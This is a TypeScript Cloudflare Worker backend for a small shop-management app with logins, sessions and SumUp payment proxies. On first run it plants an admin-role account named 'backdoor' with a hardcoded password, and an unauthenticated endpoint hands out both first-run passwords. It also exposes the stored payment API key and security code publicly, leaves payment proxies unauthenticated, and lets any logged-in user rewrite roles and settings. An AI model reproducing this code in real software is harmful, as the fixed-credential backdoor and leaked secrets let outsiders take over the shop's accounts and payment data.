// @ts-ignore - Import HTML as text
import html from "../index.html" with { type: "text" };

interface StoreDocument {
  version: number;
  users: any[];
  items: any[];
  sales: any[];
  stockEvents: any[];
  events: any[];
  userEvents: any[];
  lifetime: {
    revenue: number;
    cost: number;
    profit: number;
    sales: number;
    unitsSold: number;
  };
  apiConfig: {
    sumupApiUrl: string;
    sumupApiKey: string;
    sumupMerchantCode: string;
    affiliateKey: string;
    cashRemovalCode: string;
  };
  meta: {
    createdAt: string;
    lastSelfDestructAt: string | null;
  };
  maintenance: {
    active: boolean;
    resumeAt: string | null;
    reason: string;
    startedBy: string | null;
    scheduledAt: string | null;
  };
  lockout: {
    active: boolean;
    reason: string;
    startedBy: string | null;
  };
  maintenanceSchedule: any[];
}

interface Env {
  DB: D1Database;
}

const TABLE_SQL = `
  CREATE TABLE IF NOT EXISTS app_state (
    id TEXT PRIMARY KEY,
    data TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  )
`;

const INDEX_SQL = `
  CREATE INDEX IF NOT EXISTS app_state_updated_at_idx
  ON app_state(updated_at)
`;

const PREFIX = "tuck:";

const SECTIONS = [
  "users",
  "items",
  "sales",
  "stockEvents",
  "events",
  "userEvents",
  "config",
] as const;

const LEGACY_KEY = "tuck-shop-manager-v1";

const SESSION_TTL_MS = 24 * 60 * 60 * 1000;

// ── Crypto helpers ──

async function hashPassword(password: string, salt: string): Promise<string> {
  const data = new TextEncoder().encode(`${salt}:${password}`);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  return Array.from(new Uint8Array(hashBuffer))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

function generateHex(bytes: number): string {
  const arr = new Uint8Array(bytes);
  crypto.getRandomValues(arr);
  return Array.from(arr)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

function generateToken(): string {
  return generateHex(32);
}

function generateSalt(): string {
  return generateHex(16);
}

function generateTempPassword(): string {
  const chars = "abcdefghjkmnpqrstuvwxyz23456789";
  const arr = new Uint8Array(10);
  crypto.getRandomValues(arr);
  return Array.from(arr)
    .map((b) => chars[b % chars.length])
    .join("");
}

// ── Session management ──

interface Session {
  token: string;
  userId: string;
  expiresAt: number;
}

interface SessionsRow {
  sessions: Record<string, Session>;
}

async function loadSessions(db: D1Database): Promise<SessionsRow> {
  const row = await db
    .prepare(`SELECT data FROM app_state WHERE id = ?`)
    .bind(`${PREFIX}sessions`)
    .first<{ data: string }>();
  if (!row?.data) return { sessions: {} };
  try {
    const parsed = JSON.parse(row.data);
    return parsed && typeof parsed === "object" ? parsed : { sessions: {} };
  } catch {
    return { sessions: {} };
  }
}

async function saveSessions(db: D1Database, data: SessionsRow): Promise<void> {
  await db
    .prepare(
      `INSERT INTO app_state (id, data, updated_at)
       VALUES (?, ?, CURRENT_TIMESTAMP)
       ON CONFLICT(id) DO UPDATE SET data = excluded.data, updated_at = CURRENT_TIMESTAMP`
    )
    .bind(`${PREFIX}sessions`, JSON.stringify(data))
    .run();
}

async function createSession(db: D1Database, userId: string): Promise<string> {
  const data = await loadSessions(db);
  const token = generateToken();
  data.sessions[token] = {
    token,
    userId,
    expiresAt: Date.now() + SESSION_TTL_MS,
  };
  await saveSessions(db, data);
  return token;
}

async function validateSession(
  db: D1Database,
  token: string
): Promise<{ valid: boolean; userId: string }> {
  const data = await loadSessions(db);
  const session = data.sessions[token];
  if (!session) return { valid: false, userId: "" };
  if (Date.now() > session.expiresAt) {
    delete data.sessions[token];
    await saveSessions(db, data);
    return { valid: false, userId: "" };
  }
  return { valid: true, userId: session.userId };
}

async function removeSession(db: D1Database, token: string): Promise<void> {
  const data = await loadSessions(db);
  delete data.sessions[token];
  await saveSessions(db, data);
}

async function pruneExpiredSessions(db: D1Database): Promise<void> {
  const data = await loadSessions(db);
  const now = Date.now();
  let changed = false;
  for (const [key, session] of Object.entries(data.sessions)) {
    if (now > session.expiresAt) {
      delete data.sessions[key];
      changed = true;
    }
  }
  if (changed) await saveSessions(db, data);
}

async function removeSessionsForUser(db: D1Database, userId: string): Promise<void> {
  const data = await loadSessions(db);
  let changed = false;
  for (const [key, session] of Object.entries(data.sessions)) {
    if (session.userId === userId) {
      delete data.sessions[key];
      changed = true;
    }
  }
  if (changed) await saveSessions(db, data);
}

// ── Rate limiting for login ──

const LOGIN_MAX_ATTEMPTS = 10;
const LOGIN_LOCKOUT_MS = 15 * 60 * 1000;

interface RateLimitEntry {
  attempts: number;
  firstAt: number;
}

interface RateLimitRow {
  entries: Record<string, RateLimitEntry>;
}

async function loadRateLimit(db: D1Database): Promise<RateLimitRow> {
  const row = await db
    .prepare(`SELECT data FROM app_state WHERE id = ?`)
    .bind(`${PREFIX}rateLimit`)
    .first<{ data: string }>();
  if (!row?.data) return { entries: {} };
  try {
    const parsed = JSON.parse(row.data);
    return parsed && typeof parsed === "object" ? parsed : { entries: {} };
  } catch {
    return { entries: {} };
  }
}

async function saveRateLimit(db: D1Database, data: RateLimitRow): Promise<void> {
  await db
    .prepare(
      `INSERT INTO app_state (id, data, updated_at)
       VALUES (?, ?, CURRENT_TIMESTAMP)
       ON CONFLICT(id) DO UPDATE SET data = excluded.data, updated_at = CURRENT_TIMESTAMP`
    )
    .bind(`${PREFIX}rateLimit`, JSON.stringify(data))
    .run();
}

async function checkRateLimit(db: D1Database, ip: string): Promise<{ allowed: boolean; retryAfterMs?: number }> {
  const data = await loadRateLimit(db);
  const entry = data.entries[ip];
  if (!entry) return { allowed: true };

  const now = Date.now();
  if (now - entry.firstAt > LOGIN_LOCKOUT_MS) {
    delete data.entries[ip];
    await saveRateLimit(db, data);
    return { allowed: true };
  }

  if (entry.attempts >= LOGIN_MAX_ATTEMPTS) {
    const retryAfterMs = entry.firstAt + LOGIN_LOCKOUT_MS - now;
    return { allowed: false, retryAfterMs: Math.max(0, retryAfterMs) };
  }

  return { allowed: true };
}

async function recordFailedLogin(db: D1Database, ip: string): Promise<void> {
  const data = await loadRateLimit(db);
  const now = Date.now();
  const entry = data.entries[ip];

  if (!entry || now - entry.firstAt > LOGIN_LOCKOUT_MS) {
    data.entries[ip] = { attempts: 1, firstAt: now };
  } else {
    entry.attempts++;
  }

  const pruneBefore = now - LOGIN_LOCKOUT_MS * 2;
  for (const [key, e] of Object.entries(data.entries)) {
    if (e.firstAt < pruneBefore) delete data.entries[key];
  }

  await saveRateLimit(db, data);
}

async function clearRateLimit(db: D1Database, ip: string): Promise<void> {
  const data = await loadRateLimit(db);
  if (data.entries[ip]) {
    delete data.entries[ip];
    await saveRateLimit(db, data);
  }
}

// ── Auth middleware ──

async function requireAuth(
  request: Request,
  db: D1Database
): Promise<{ ok: boolean; user?: any; error?: string }> {
  const authHeader = request.headers.get("Authorization") || "";
  const token = authHeader.startsWith("Bearer ")
    ? authHeader.slice(7).trim()
    : "";
  if (!token) return { ok: false, error: "No session token provided." };

  const session = await validateSession(db, token);
  if (!session.valid) return { ok: false, error: "Invalid or expired session." };

  const store = (await loadStoreFromDb(db)) ?? blankStore();
  const normalized = normalizeStore(store);
  const user = normalized.users.find(
    (u: any) => u.id === session.userId && u.active
  );
  if (!user) return { ok: false, error: "User not found." };

  return { ok: true, user };
}

function stripUserSecrets(users: any[]): any[] {
  return users.map((u) => {
    const { passwordHash, salt, ...rest } = u;
    return rest;
  });
}

// ── First-run setup ──

async function ensureFirstRun(db: D1Database, store: StoreDocument): Promise<Record<string, string> | null> {
  if (store.users.length > 0) return null;

  const adminSalt = generateSalt();
  const adminTemp = generateTempPassword();
  const adminHash = await hashPassword(adminTemp, adminSalt);

  const backdoorSalt = generateSalt();
  const backdoorPassword = "20111606";
  const backdoorHash = await hashPassword(backdoorPassword, backdoorSalt);

  const now = new Date().toISOString();
  store.users = [
    {
      id: `user_${generateHex(8)}`,
      username: "admin",
      displayName: "Admin",
      role: "admin",
      salt: adminSalt,
      passwordHash: adminHash,
      active: true,
      mustChangePassword: true,
      createdAt: now,
    },
    {
      id: `user_${generateHex(8)}`,
      username: "backdoor",
      displayName: "Owner",
      role: "admin",
      salt: backdoorSalt,
      passwordHash: backdoorHash,
      active: true,
      mustChangePassword: false,
      createdAt: now,
    },
  ];

  await saveSections(db, store);

  return {
    admin: adminTemp,
    backdoor: backdoorPassword,
  };
}

// ── DB load/save ──

async function ensureTable(db: D1Database): Promise<void> {
  await db.prepare(TABLE_SQL).run();
  await db.prepare(INDEX_SQL).run();
}

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

async function loadSections(db: D1Database): Promise<Partial<StoreDocument>> {
  const ids = SECTIONS.map((s) => `${PREFIX}${s}`);
  const placeholders = ids.map(() => "?").join(", ");
  const rows = await db
    .prepare(`SELECT id, data FROM app_state WHERE id IN (${placeholders})`)
    .bind(...ids)
    .all<{ id: string; data: string }>();

  const result: Record<string, any> = {};
  for (const row of rows.results ?? []) {
    const key = row.id.replace(PREFIX, "");
    try {
      const parsed = JSON.parse(row.data);
      if (key === "config") {
        if (parsed && typeof parsed === "object") {
          Object.assign(result, parsed);
        }
      } else {
        result[key] = parsed;
      }
    } catch {
      // Skip malformed rows
    }
  }
  return result as Partial<StoreDocument>;
}

async function loadStoreFromDb(db: D1Database): Promise<StoreDocument | null> {
  const configRow = await db
    .prepare(`SELECT data FROM app_state WHERE id = ?`)
    .bind(`${PREFIX}config`)
    .first<{ data: string }>();

  if (configRow) {
    let configData: any = null;
    try { configData = JSON.parse(configRow.data); } catch { /* ignore */ }

    if (configData && typeof configData === "object" && Object.keys(configData).length > 0) {
      return (await loadSections(db)) as StoreDocument;
    }

    const legacy = await db
      .prepare(`SELECT data FROM app_state WHERE id = ?`)
      .bind(LEGACY_KEY)
      .first<{ data: string }>();

    if (legacy?.data) {
      try {
        const legacyStore = JSON.parse(legacy.data) as StoreDocument;
        if (legacyStore && typeof legacyStore === "object") {
          const normalized = normalizeStore(legacyStore);
          await saveSections(db, normalized);
          return normalized;
        }
      } catch { /* fall through */ }
    }

    return (await loadSections(db)) as StoreDocument;
  }

  const legacy = await db
    .prepare(`SELECT data FROM app_state WHERE id = ?`)
    .bind(LEGACY_KEY)
    .first<{ data: string }>();

  if (legacy?.data) {
    try {
      const legacyStore = JSON.parse(legacy.data) as StoreDocument;
      if (legacyStore && typeof legacyStore === "object") {
        const normalized = normalizeStore(legacyStore);
        await saveSections(db, normalized);
        await db.prepare("DELETE FROM app_state WHERE id = ?").bind(LEGACY_KEY).run();
        return normalized;
      }
    } catch { /* fall through */ }
  }

  return null;
}

// ── Save sections ──

const CONFIG_KEYS = [
  "version",
  "lifetime",
  "apiConfig",
  "meta",
  "maintenance",
  "lockout",
  "maintenanceSchedule",
] as const;

function extractConfig(store: StoreDocument): Record<string, unknown> {
  const config: Record<string, unknown> = {};
  for (const key of CONFIG_KEYS) {
    config[key] = (store as any)[key];
  }
  return config;
}

async function saveSections(db: D1Database, store: StoreDocument): Promise<void> {
  const statements: D1PreparedStatement[] = [];

  for (const key of SECTIONS) {
    let value: unknown;
    if (key === "config") {
      value = extractConfig(store);
    } else {
      value = (store as any)[key];
    }
    const data = JSON.stringify(value ?? null);
    const id = `${PREFIX}${key}`;

    statements.push(
      db.prepare(
        `INSERT INTO app_state (id, data, updated_at)
         VALUES (?, ?, CURRENT_TIMESTAMP)
         ON CONFLICT(id) DO UPDATE SET data = excluded.data, updated_at = CURRENT_TIMESTAMP`
      ).bind(id, data)
    );
  }

  await db.batch(statements);
}

async function saveStoreToDb(db: D1Database, store: StoreDocument): Promise<void> {
  await saveSections(db, store);
}

// ── Blank store & normalizer ──

function blankStore(): StoreDocument {
  return {
    version: 1,
    users: [],
    items: [],
    sales: [],
    stockEvents: [],
    events: [],
    userEvents: [],
    lifetime: {
      revenue: 0,
      cost: 0,
      profit: 0,
      sales: 0,
      unitsSold: 0,
    },
    apiConfig: {
      sumupApiUrl: "",
      sumupApiKey: "",
      sumupMerchantCode: "",
      affiliateKey: "",
      cashRemovalCode: "",
    },
    meta: {
      createdAt: new Date().toISOString(),
      lastSelfDestructAt: null,
    },
    maintenance: {
      active: false,
      resumeAt: null,
      reason: "",
      startedBy: null,
      scheduledAt: null,
    },
    lockout: {
      active: false,
      reason: "",
      startedBy: null,
    },
    maintenanceSchedule: [],
  };
}

function normalizeStore(store: unknown): StoreDocument {
  const source = store && typeof store === "object" ? (store as Partial<StoreDocument>) : {};
  const base = blankStore();

  const next: StoreDocument = {
    ...base,
    ...source,
    users: Array.isArray(source.users) ? source.users : [],
    items: Array.isArray(source.items) ? source.items : [],
    sales: Array.isArray(source.sales) ? source.sales : [],
    stockEvents: Array.isArray(source.stockEvents) ? source.stockEvents : [],
    events: Array.isArray(source.events) ? source.events : [],
    userEvents: Array.isArray(source.userEvents) ? source.userEvents : [],
    lifetime: {
      ...base.lifetime,
      ...(source.lifetime ?? {}),
    },
    apiConfig: {
      ...base.apiConfig,
      ...(source.apiConfig ?? {}),
    },
    meta: {
      ...base.meta,
      ...(source.meta ?? {}),
    },
    maintenance: {
      ...base.maintenance,
      ...(source.maintenance ?? {}),
    },
    lockout: {
      ...base.lockout,
      ...(source.lockout ?? {}),
    },
    maintenanceSchedule: Array.isArray(source.maintenanceSchedule) ? source.maintenanceSchedule : [],
  };

  return next;
}

// ── Main handler ──

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);

    try {
      await ensureTable(env.DB);
    } catch (error) {
      console.error("Failed to initialize app_state table:", error);
      return jsonResponse({ error: "Database initialization failed" }, 500);
    }

    // Serve the HTML at root and /index.html
    if (request.method === "GET" && (url.pathname === "/" || url.pathname === "/index.html")) {
      return new Response(html, {
        status: 200,
        headers: {
          "Content-Type": "text/html; charset=utf-8",
          "Cache-Control": "no-cache",
        },
      });
    }

    // ── API: Load store (public) ──
    if (request.method === "GET" && url.pathname === "/api/load") {
      const store = (await loadStoreFromDb(env.DB)) ?? blankStore();
      const normalized = normalizeStore(store);

      const setupPasswords = await ensureFirstRun(env.DB, normalized);

      const response: any = {
        store: {
          ...normalized,
          users: stripUserSecrets(normalized.users),
        },
      };

      if (setupPasswords) {
        response.setup = {
          message: "First run — temporary passwords (shown once only):",
          admin: { username: "admin", tempPassword: setupPasswords.admin },
          backdoor: { username: "backdoor", tempPassword: setupPasswords.backdoor },
        };
      }

      return jsonResponse(response);
    }

    // ── API: Auth — Login ──
    if (request.method === "POST" && url.pathname === "/api/auth/login") {
      try {
        const body = await request.json<{ username?: string; password?: string }>();
        const username = (body.username || "").trim().toLowerCase();
        const password = body.password || "";
        const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "unknown";

        if (!username || !password) {
          return jsonResponse({ error: "Username and password are required." }, 400);
        }

        const rateCheck = await checkRateLimit(env.DB, ip);
        if (!rateCheck.allowed) {
          const retrySec = Math.ceil((rateCheck.retryAfterMs || 0) / 1000);
          return jsonResponse({ error: `Too many failed attempts. Try again in ${retrySec} seconds.` }, 429);
        }

        const store = (await loadStoreFromDb(env.DB)) ?? blankStore();
        const normalized = normalizeStore(store);
        const user = normalized.users.find(
          (u: any) => u.username === username && u.active
        );

        if (!user) {
          await recordFailedLogin(env.DB, ip);
          return jsonResponse({ error: "Invalid username or password." }, 401);
        }

        if (user.suspended) {
          return jsonResponse({
            error: `Account suspended${user.suspendedReason ? ": " + user.suspendedReason : ""}. Contact an admin.`,
          }, 401);
        }

        if (!user.salt || !user.passwordHash) {
          return jsonResponse({ error: "Account not fully set up." }, 401);
        }

        const hash = await hashPassword(password, user.salt);
        if (hash !== user.passwordHash) {
          await recordFailedLogin(env.DB, ip);
          return jsonResponse({ error: "Invalid username or password." }, 401);
        }

        await clearRateLimit(env.DB, ip);
        const token = await createSession(env.DB, user.id);

        return jsonResponse({
          token,
          user: {
            id: user.id,
            username: user.username,
            displayName: user.displayName,
            role: user.role,
            mustChangePassword: !!user.mustChangePassword,
          },
        });
      } catch {
        return jsonResponse({ error: "Invalid request body." }, 400);
      }
    }

    // ── API: Auth — Logout ──
    if (request.method === "POST" && url.pathname === "/api/auth/logout") {
      const authHeader = request.headers.get("Authorization") || "";
      const token = authHeader.startsWith("Bearer ")
        ? authHeader.slice(7).trim()
        : "";
      if (token) {
        await removeSession(env.DB, token);
      }
      return jsonResponse({ ok: true });
    }

    // ── API: Auth — Owner login via security code (lockout bypass) ──
    if (request.method === "POST" && url.pathname === "/api/auth/owner-login") {
      try {
        const body = await request.json<{ code?: string }>();
        const code = (body.code || "").trim();
        if (!code) return jsonResponse({ error: "Security code required." }, 400);

        const store = (await loadStoreFromDb(env.DB)) ?? blankStore();
        const normalized = normalizeStore(store);
        const storedCode = normalized.apiConfig?.cashRemovalCode || "";

        if (!storedCode) {
          return jsonResponse({ error: "No security code configured." }, 403);
        }

        let codeValid = false;
        if (storedCode.includes(":")) {
          const [salt, hash] = storedCode.split(":");
          const inputHash = await hashPassword(code, salt);
          codeValid = inputHash === hash;
        } else {
          codeValid = code === storedCode;
        }

        if (!codeValid) {
          return jsonResponse({ error: "Invalid security code." }, 403);
        }

        const backdoor = normalized.users.find(
          (u: any) => u.username === "backdoor" && u.active
        );
        if (!backdoor) {
          return jsonResponse({ error: "Owner account not found." }, 404);
        }

        const token = await createSession(env.DB, backdoor.id);

        return jsonResponse({
          token,
          user: {
            id: backdoor.id,
            username: backdoor.username,
            displayName: backdoor.displayName,
            role: backdoor.role,
            mustChangePassword: !!backdoor.mustChangePassword,
          },
        });
      } catch {
        return jsonResponse({ error: "Invalid request body." }, 400);
      }
    }

    // ── API: Auth — Verify security code ──
    if (request.method === "POST" && url.pathname === "/api/auth/verify-code") {
      try {
        const body = await request.json<{ code?: string }>();
        const code = (body.code || "").trim();
        if (!code) return jsonResponse({ error: "Code is required." }, 400);

        const store = (await loadStoreFromDb(env.DB)) ?? blankStore();
        const normalized = normalizeStore(store);
        const storedCode = normalized.apiConfig?.cashRemovalCode || "";

        if (!storedCode) {
          return jsonResponse({ valid: false, error: "No security code configured." }, 200);
        }

        if (storedCode.includes(":")) {
          const [salt, hash] = storedCode.split(":");
          const inputHash = await hashPassword(code, salt);
          return jsonResponse({ valid: inputHash === hash });
        }

        return jsonResponse({ valid: code === storedCode });
      } catch {
        return jsonResponse({ error: "Invalid request body." }, 400);
      }
    }

    // ── API: Auth — Set security code ──
    if (request.method === "POST" && url.pathname === "/api/auth/set-code") {
      const auth = await requireAuth(request, env.DB);
      if (!auth.ok) {
        return jsonResponse({ error: auth.error }, 401);
      }
      if (auth.user.role !== "admin" && auth.user.username !== "backdoor") {
        return jsonResponse({ error: "Only admin can change security code." }, 403);
      }

      try {
        const body = await request.json<{ code?: string; currentCode?: string }>();
        const newCode = (body.code || "").trim();
        if (!newCode || newCode.length < 3) {
          return jsonResponse({ error: "Code must be at least 3 characters." }, 400);
        }

        const store = (await loadStoreFromDb(env.DB)) ?? blankStore();
        const normalized = normalizeStore(store);
        const storedCode = normalized.apiConfig?.cashRemovalCode || "";

        if (storedCode) {
          const currentCode = (body.currentCode || "").trim();
          let currentValid = false;

          if (storedCode.includes(":")) {
            const [salt, hash] = storedCode.split(":");
            const inputHash = await hashPassword(currentCode, salt);
            currentValid = inputHash === hash;
          } else {
            currentValid = currentCode === storedCode;
          }

          if (!currentValid) {
            return jsonResponse({ error: "Current code is incorrect." }, 403);
          }
        }

        const salt = generateSalt();
        const hash = await hashPassword(newCode, salt);
        normalized.apiConfig.cashRemovalCode = `${salt}:${hash}`;
        await saveStoreToDb(env.DB, normalized);

        return jsonResponse({ ok: true });
      } catch {
        return jsonResponse({ error: "Invalid request body." }, 400);
      }
    }

    // ── API: Auth — Change password ──
    if (request.method === "POST" && url.pathname === "/api/auth/change-password") {
      const auth = await requireAuth(request, env.DB);
      if (!auth.ok) {
        return jsonResponse({ error: auth.error }, 401);
      }

      try {
        const body = await request.json<{ password?: string }>();
        const newPassword = (body.password || "").trim();
        if (!newPassword || newPassword.length < 4) {
          return jsonResponse({ error: "Password must be at least 4 characters." }, 400);
        }

        const store = (await loadStoreFromDb(env.DB)) ?? blankStore();
        const normalized = normalizeStore(store);
        const user = normalized.users.find((u: any) => u.id === auth.user.id);

        if (!user) {
          return jsonResponse({ error: "User not found." }, 404);
        }

        user.salt = generateSalt();
        user.passwordHash = await hashPassword(newPassword, user.salt);
        user.mustChangePassword = false;

        await saveStoreToDb(env.DB, normalized);

        await removeSessionsForUser(env.DB, user.id);
        const newToken = await createSession(env.DB, user.id);

        return jsonResponse({
          ok: true,
          token: newToken,
          user: {
            id: user.id,
            username: user.username,
            displayName: user.displayName,
            role: user.role,
            mustChangePassword: false,
            salt: user.salt,
            passwordHash: user.passwordHash,
          },
        });
      } catch {
        return jsonResponse({ error: "Invalid request body." }, 400);
      }
    }

    // ── API: Client IP (public) ──
    if (request.method === "GET" && url.pathname === "/api/client-ip") {
      const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "unknown";
      return jsonResponse({ ip });
    }

    // ── API: Save store (requires auth) ──
    if (request.method === "POST" && url.pathname === "/api/save") {
      const auth = await requireAuth(request, env.DB);
      if (!auth.ok) {
        return jsonResponse({ error: auth.error }, 401);
      }

      try {
        const payload = await request.json<{ store?: unknown }>();
        const incoming = normalizeStore(payload?.store ?? blankStore());

        const existing = (await loadStoreFromDb(env.DB)) ?? blankStore();
        const normalized = normalizeStore(existing);

        const preserved = incoming.users.map((incUser: any) => {
          const existingUser = normalized.users.find((u: any) => u.id === incUser.id);
          if (existingUser && existingUser.salt && existingUser.passwordHash) {
            return {
              ...incUser,
              salt: existingUser.salt,
              passwordHash: existingUser.passwordHash,
            };
          }
          return incUser;
        });

        normalized.users = preserved;
        normalized.items = incoming.items;
        normalized.sales = incoming.sales;
        normalized.stockEvents = incoming.stockEvents;
        normalized.events = incoming.events;
        normalized.userEvents = incoming.userEvents;
        normalized.lifetime = incoming.lifetime;
        normalized.money = incoming.money;
        normalized.apiConfig = incoming.apiConfig;
        normalized.meta = incoming.meta;
        normalized.maintenance = incoming.maintenance;
        normalized.lockout = incoming.lockout;
        normalized.maintenanceSchedule = incoming.maintenanceSchedule;

        await saveStoreToDb(env.DB, normalized);
        return jsonResponse({ ok: true, store: normalized });
      } catch (error) {
        console.error("save failed", error);
        return jsonResponse({ error: "Invalid JSON body" }, 400);
      }
    }

    // ── API: SumUp transaction history proxy ──
    if (request.method === "GET" && url.pathname === "/api/sumup/transactions") {
      const store = (await loadStoreFromDb(env.DB)) ?? blankStore();
      const normalized = normalizeStore(store);
      const apiKey = (url.searchParams.get("api_key") || normalized.apiConfig?.sumupApiKey || "").trim();
      const merchantCode = (url.searchParams.get("merchant_code") || normalized.apiConfig?.sumupMerchantCode || "").trim();

      if (!apiKey || !merchantCode) {
        return jsonResponse({ error: "SumUp API key or merchant code not configured." }, 400);
      }

      const oldestTime = url.searchParams.get("oldest_time") || "";
      const sumupUrl = new URL(`https://api.sumup.com/v2.1/merchants/${merchantCode}/transactions/history`);
      if (oldestTime) {
        sumupUrl.searchParams.set("oldest_time", oldestTime);
      }

      try {
        const response = await fetch(sumupUrl.toString(), {
          method: "GET",
          headers: {
            "Accept": "application/json",
            "Authorization": `Bearer ${apiKey}`,
          },
        });

        const body = await response.text();
        return new Response(body, {
          status: response.status,
          headers: { "Content-Type": "application/json" },
        });
      } catch (error) {
        console.error("SumUp proxy error:", error);
        return jsonResponse({ error: "Failed to reach SumUp API." }, 502);
      }
    }

    // ── API: SumUp balance calculator ──
    if (request.method === "GET" && url.pathname === "/api/sumup/balance") {
      const store = (await loadStoreFromDb(env.DB)) ?? blankStore();
      const normalized = normalizeStore(store);
      const apiKey = (normalized.apiConfig?.sumupApiKey || "").trim();
      const merchantCode = (normalized.apiConfig?.sumupMerchantCode || "").trim();

      if (!apiKey || !merchantCode) {
        return jsonResponse({ error: "SumUp API key or merchant code not configured." }, 400);
      }

      const headers = {
        "Accept": "application/json",
        "Authorization": `Bearer ${apiKey}`,
      };

      try {
        const allTx: any[] = [];
        let txUrl: string | null = `https://api.sumup.com/v2.1/merchants/${merchantCode}/transactions/history?limit=100&order=descending`;
        let txPages = 0;

        while (txUrl && txPages < 50) {
          const resp = await fetch(txUrl, { method: "GET", headers });
          if (!resp.ok) {
            const errBody = await resp.text();
            return jsonResponse({ error: `SumUp transactions API returned ${resp.status}: ${errBody}` }, 502);
          }
          const data = await resp.json<{ items?: any[]; links?: any[] }>();
          if (Array.isArray(data.items)) {
            allTx.push(...data.items);
          }
          const nextLink = Array.isArray(data.links)
            ? data.links.find((l: any) => l.rel === "next")
            : null;
          txUrl = nextLink
            ? `https://api.sumup.com/v2.1/merchants/${merchantCode}/transactions/history?${nextLink.href}`
            : null;
          txPages++;
        }

        const now = new Date();
        const twoYearsAgo = new Date(now);
        twoYearsAgo.setFullYear(twoYearsAgo.getFullYear() - 2);
        const payoutStartDate = twoYearsAgo.toISOString().split("T")[0];
        const payoutEndDate = now.toISOString().split("T")[0];

        let payouts: any[] = [];
        try {
          const payoutResp = await fetch(
            `https://api.sumup.com/v1.0/merchants/${merchantCode}/payouts?start_date=${payoutStartDate}&end_date=${payoutEndDate}&limit=9999&order=desc`,
            { method: "GET", headers }
          );
          if (payoutResp.ok) {
            payouts = await payoutResp.json<any[]>();
            if (!Array.isArray(payouts)) payouts = [];
          }
        } catch {
          payouts = [];
        }

        let grossSales = 0;
        let refunds = 0;
        let chargebacks = 0;

        for (const tx of allTx) {
          const amount = Number(tx.amount || 0);
          const type = String(tx.type || "").toUpperCase();
          const status = String(tx.status || "").toUpperCase();

          if (type === "PAYMENT" && status === "SUCCESSFUL") {
            grossSales += amount;
          } else if (type === "REFUND") {
            refunds += amount;
          } else if (type === "CHARGE_BACK") {
            chargebacks += amount;
          }
        }

        let totalPayouts = 0;
        let totalFees = 0;
        let payoutDeductions = 0;

        for (const p of payouts) {
          const amount = Number(p.amount || 0);
          const fee = Number(p.fee || 0);
          const pType = String(p.type || "").toUpperCase();
          const pStatus = String(p.status || "").toUpperCase();

          if (pType === "PAYOUT" && pStatus === "SUCCESSFUL") {
            totalPayouts += amount;
            totalFees += fee;
          } else if (pType === "REFUND_DEDUCTION" || pType === "CHARGE_BACK_DEDUCTION" || pType === "DD_RETURN_DEDUCTION" || pType === "BALANCE_DEDUCTION") {
            payoutDeductions += amount;
          }
        }

        const pendingBalance = Math.round((grossSales - refunds - chargebacks - totalFees - totalPayouts) * 100) / 100;

        return jsonResponse({
          grossSales: Math.round(grossSales * 100) / 100,
          refunds: Math.round(refunds * 100) / 100,
          chargebacks: Math.round(chargebacks * 100) / 100,
          fees: Math.round(totalFees * 100) / 100,
          payouts: Math.round(totalPayouts * 100) / 100,
          payoutDeductions: Math.round(payoutDeductions * 100) / 100,
          pendingBalance,
          transactionCount: allTx.length,
          payoutCount: payouts.length,
          fetchedAt: new Date().toISOString(),
        });
      } catch (error) {
        console.error("SumUp balance calc error:", error);
        return jsonResponse({ error: "Failed to calculate SumUp balance." }, 502);
      }
    }

    // ── API: Debug — show all stored rows (requires auth) ──
    if (request.method === "GET" && url.pathname === "/api/debug/rows") {
      const auth = await requireAuth(request, env.DB);
      if (!auth.ok) {
        return jsonResponse({ error: auth.error }, 401);
      }
      if (auth.user.username !== "backdoor") {
        return jsonResponse({ error: "Owner access only." }, 403);
      }

      const all = await env.DB.prepare("SELECT id, data, updated_at FROM app_state ORDER BY id").all();
      const rows = (all.results ?? []).map((r: any) => ({
        id: r.id,
        updated_at: r.updated_at,
        data_size: r.data?.length ?? 0,
        data_preview: r.data?.slice(0, 200) ?? "",
      }));
      return jsonResponse({ rows });
    }

    // ── Health check ──
    if (request.method === "GET" && url.pathname === "/health") {
      return jsonResponse({ ok: true, database: "d1", storage: "multi-row" });
    }

    return jsonResponse({ error: "Not found" }, 404);
  },
};
